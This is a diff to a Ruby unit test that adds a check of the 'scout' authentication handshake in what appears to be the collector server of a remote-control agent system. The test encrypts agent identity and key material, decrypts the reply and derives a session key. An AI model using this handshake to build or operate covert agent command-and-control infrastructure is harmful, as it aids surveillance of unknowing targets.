@@ -1,6 +1,7 @@
 require "helper"
 require 'rcs-common'
 require 'singleton'
+require 'base64'
 
 module RCS
 module Collector
@@ -106,6 +107,44 @@ class TestProtocol < Test::Unit::TestCase
 
     # check if the nonce is equal in the response
     assert_equal nonce, snonce.slice(0..15)
+
+    assert_true Protocol.valid_authentication('test-peer', cookie)
+  end
+
+  def test_valid_auth_scout
+    # Base64 ( Crypt_S ( Pver, Kd, sha(Kc | Kd), BuildId, InstanceId, Platform ) )
+    pver = [1].pack('I')
+    kd = "\x01" * 16
+    build = "RCS_9999999999".ljust(16, "\x00")
+    instance = "\x03" * 20
+    platform = "\x00" + "\x00" + "\x00" + "\x00"
+    sha = Digest::SHA1.digest(DB.instance.factory_key_of('RCS_9999999999') + kd)
+    message = pver + kd + sha + build + instance + platform
+    message = aes_encrypt(message, DB.instance.agent_signature, PAD_NOPAD)
+    message += SecureRandom.random_bytes(rand(128..1024))
+    message = Base64.encode64(message)
+
+    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
+
+    assert_equal "application/octet-stream", type
+    assert_kind_of String, cookie
+
+    # Base64 ( Crypt_C ( Ks, sha(K), Response ) )
+    content = Base64.decode64(content)
+
+    # normalize to 16 block
+    newlen = content.length - (content.length % 16)
+    content = content[0..newlen-1]
+
+    content = aes_decrypt(content, DB.instance.factory_key_of('RCS_9999999999'), PAD_NOPAD)
+
+    ks = content.slice!(0..15)
+    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
+    # we use a schema like PBKDF1
+    k = Digest::SHA1.digest(DB.instance.factory_key_of('RCS_9999999999') + ks + kd)
+
+    check = content.slice!(0..19)
+    assert_equal check, Digest::SHA1.digest(k + ks)
 
     assert_true Protocol.valid_authentication('test-peer', cookie)
   end
